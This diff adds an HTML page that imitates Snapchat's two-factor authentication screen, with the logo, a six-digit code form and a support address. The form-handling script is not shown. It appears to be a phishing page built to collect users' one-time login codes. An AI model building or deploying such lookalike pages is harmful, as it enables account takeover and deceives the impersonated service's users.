@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Verify Your Code</title>
+    <link rel="stylesheet" href="Snapchat.css">
+</head>
+<body>
+    <div class="container">
+        <div class="language-container">
+            <button class="language-btn" onclick="toggleLanguageMenu()">🌐</button>
+            <div class="language-menu" id="language-menu">
+                <a href="#" onclick="setLanguage('en')">English</a>
+                <a href="#" onclick="setLanguage('fr')">Français</a>
+            </div>
+        </div>
+        <img src="Snapchat.png" alt="Snapchat Logo" class="logo">
+        <h1 id="title">Two-Factor Authentication</h1>
+        <p id="subtitle">Enter the 6-digit code we sent you</p>
+        <form id="codeForm">
+            <div class="code-input">
+                <input type="text" name="digit1" maxlength="1" oninput="moveToNext(this, 1)" required>
+                <input type="text" name="digit2" maxlength="1" oninput="moveToNext(this, 2)" required>
+                <input type="text" name="digit3" maxlength="1" oninput="moveToNext(this, 3)" required>
+                <input type="text" name="digit4" maxlength="1" oninput="moveToNext(this, 4)" required>
+                <input type="text" name="digit5" maxlength="1" oninput="moveToNext(this, 5)" required>
+                <input type="text" name="digit6" maxlength="1" oninput="moveToNext(this, 6)" required>
+            </div>
+            <button type="submit" class="verify-btn" id="continue-btn">Continue</button>
+        </form>
+        <a href="#" class="resend-link" id="resend-link" onclick="resendCode()">Resend Code</a>
+        <p id="message"></p>
+        <p class="support-text" id="support-text">Having trouble? Contact support@snapchat.com</p>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
